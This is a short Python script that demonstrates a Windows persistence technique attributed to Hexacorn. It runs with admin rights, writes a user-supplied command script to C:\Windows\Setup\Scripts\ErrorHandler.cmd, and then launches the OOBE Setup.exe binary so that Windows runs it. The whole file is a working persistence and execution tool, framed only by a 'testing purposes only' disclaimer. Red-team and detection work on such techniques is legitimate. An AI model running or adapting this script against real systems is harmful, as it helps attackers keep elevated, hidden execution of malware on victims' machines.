from pyuac import main_requires_admin
import pathlib
import sys
import os


@main_requires_admin
def main():

    print("""This is a persistence technique demonstrated by Adam (@Hexacorn) using LOLBins to execute malware.
    Please use with caution and for testing purposes only!
    """
    )
    
    agree = input("Do you agree with the terms? Y/N: ")
    if agree.lower() == "y":
        try:
            pathlib.Path('C:\\Windows\\Setup\\Scripts').mkdir(parents=True, exist_ok=True)
            print("MSG: Path Creation Successful!")
        except:
            print("MSG: Couldn't Create Path!")

        script = input("enter script: ")
        print("Script: " + str(script))
        file = open("C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd", 'w')
        file.write(script)
        file.close()

        print("Executing LOLBin: Setup.exe from OOBE (Out-Of-Box Experience)! ")

        os.system("C:\\Windows\\System32\\oobe\\Setup.exe")
    else:
        print("Exiting!")
        sys.exit() 


if __name__ == "__main__":
    main()